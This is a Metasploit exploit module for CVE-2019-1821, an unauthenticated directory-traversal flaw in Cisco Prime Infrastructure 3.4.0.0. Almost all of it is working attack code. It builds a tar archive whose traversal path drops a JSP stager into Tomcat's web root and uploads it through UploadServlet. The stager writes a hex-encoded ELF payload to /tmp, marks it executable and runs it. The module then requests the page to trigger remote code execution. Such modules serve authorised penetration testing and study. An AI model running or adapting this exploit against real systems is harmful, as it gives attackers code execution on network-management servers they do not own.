# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Cisco Prime Infrastructure. The issue is that
        the TarArchive Java class the HA Health Monitor component uses does not check for any
        directory traversals while unpacking a Tar file, which can be abused by a remote user to
        leverage the UploadServlet class to upload a JSP payload to the Apache Tomcat&#039;s web apps
        directory, and gain arbitrary remote code execution. Note that authentication is not
        required to exploit this vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Steven Seeley&#039;, # Original discovery, PoC
          &#039;sinn3r&#039;         # Metasploit module
        ],
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Targets&#039;        =>
        [
          [ &#039;Cisco Prime Infrastructure 3.4.0.0&#039;, { } ]
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2019-1821&#039;],
          [&#039;URL&#039;, &#039;https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html&#039;],
          [&#039;URL&#039;, &#039;https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190515-pi-rce&#039;],
          [&#039;URL&#039;, &#039;https://srcincite.io/advisories/src-2019-0034/&#039;],
          [&#039;URL&#039;, &#039;https://srcincite.io/pocs/src-2019-0034.py.txt&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039; => 8082,
          &#039;SSL&#039;   => true,

        },
      &#039;Notes&#039;          =>
        {
          &#039;SideEffects&#039; => [ IOC_IN_LOGS ],
          &#039;Reliability&#039; => [ REPEATABLE_SESSION ],
          &#039;Stability&#039;   => [ CRASH_SAFE ]
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;May 15 2019&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptPort.new(&#039;WEBPORT&#039;, [true, &#039;Cisco Prime Infrastructure web interface&#039;, 443]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The route for Cisco Prime Infrastructure web interface&#039;, &#039;/&#039;])
      ])
  end

  class CPITarArchive
    attr_reader :data
    attr_reader :jsp_name
    attr_reader :tar_name
    attr_reader :stager
    attr_reader :length

    def initialize(name, stager)
      @jsp_name = "#{name}.jsp"
      @tar_name = "#{name}.tar"
      @stager = stager
      @data = make
      @length = data.length
    end

    def make
      data = &#039;&#039;
      path = "../../opt/CSCOlumos/tomcat/webapps/ROOT/#{jsp_name}"
      tar = StringIO.new
      Rex::Tar::Writer.new(tar) do |t|
        t.add_file(path, 0644) do |f|
          f.write(stager)
        end
      end
      tar.seek(0)
      data = tar.read
      tar.close
      data
    end
  end

  def check
    res = send_request_cgi({
      &#039;rport&#039;  => datastore[&#039;WEBPORT&#039;],
      &#039;SSL&#039;    => true,
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;webacs&#039;, &#039;pages&#039;, &#039;common&#039;, &#039;login.jsp&#039;)
    })

    unless res
      vprint_error(&#039;No response from the server&#039;)
      return CheckCode::Unknown
    end

    if res.code == 200 && res.headers[&#039;Server&#039;] && res.headers[&#039;Server&#039;] == &#039;Prime&#039;
      return CheckCode::Detected
    end

    CheckCode::Safe
  end

  def get_jsp_stager(out_file, bin_data)
    # For some reason, some of the bytes tend to get lost at the end.
    # Not really sure why, but some extra bytes are added to ensure the integrity
    # of the code. This file will get deleted during cleanup anyway.
    %Q|<%@ page import="java.io.*" %>
    <%
      String data = "#{Rex::Text.to_hex(bin_data, &#039;&#039;)}";
      FileOutputStream outputstream = new FileOutputStream("#{out_file}");
      int numbytes = data.length();
      byte[] bytes = new byte[numbytes/2];
      for (int counter = 0; counter < numbytes; counter += 2)
      {
        char char1 = (char) data.charAt(counter);
        char char2 = (char) data.charAt(counter + 1);
        int comb = Character.digit(char1, 16) & 0xff;
        comb <<= 4;
        comb += Character.digit(char2, 16) & 0xff;
        bytes[counter/2] = (byte)comb;
      }
      outputstream.write(bytes);
      outputstream.close();
      try {
        Runtime.getRuntime().exec("chmod +x #{out_file}");
        Runtime.getRuntime().exec("#{out_file}");
      } catch (IOException exp) {}
    %>#{Rex::Text.rand_text_alpha(30)}|
  end

  def make_tar
    elf_name = "/tmp/#{Rex::Text.rand_text_alpha(10)}.bin"
    register_file_for_cleanup(elf_name)
    elf = generate_payload_exe(code: payload.encoded)
    jsp_stager = get_jsp_stager(elf_name, elf)
    tar_name = Rex::Text.rand_text_alpha(10)
    register_file_for_cleanup("apache-tomcat-8.5.16/webapps/ROOT/#{tar_name}.jsp")
    CPITarArchive.new(tar_name, jsp_stager)
  end

  def execute_payload(tar)
    # Once executed, we are at:
    # /opt/CSCOlumos
    send_request_cgi({
      &#039;rport&#039;  => datastore[&#039;WEBPORT&#039;],
      &#039;SSL&#039;    => true,
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, tar.jsp_name)
    })
  end

  def upload_tar(tar)
    post_data = Rex::MIME::Message.new
    post_data.add_part(tar.data, nil, nil, "form-data; name=\"files\"; filename=\"#{tar.tar_name}\"")

    # The file gets uploaded to this path on the server:
    # /opt/CSCOlumos/apache-tomcat-8.5.16/webapps/ROOT/tar_name.jsp
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;servlet&#039;, &#039;UploadServlet&#039;),
      &#039;data&#039;   => post_data.to_s,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;headers&#039; =>
        {
          &#039;Destination-Dir&#039; => &#039;tftpRoot&#039;,
          &#039;Primary-IP&#039; => &#039;127.0.0.1&#039;,
          &#039;Filecount&#039; => &#039;1&#039;,
          &#039;Filename&#039; => tar.tar_name,
          &#039;FileSize&#039; => tar.length
        }
    })

    (res && res.code == 200)
  end

  def exploit
    tar = make_tar
    print_status("Uploading tar file (#{tar.length} bytes)")
    if upload_tar(tar)
      print_status(&#039;Executing JSP stager...&#039;)
      execute_payload(tar)
    else
      print_status("Failed to upload #{tar.tar_name}")
    end
  end
end

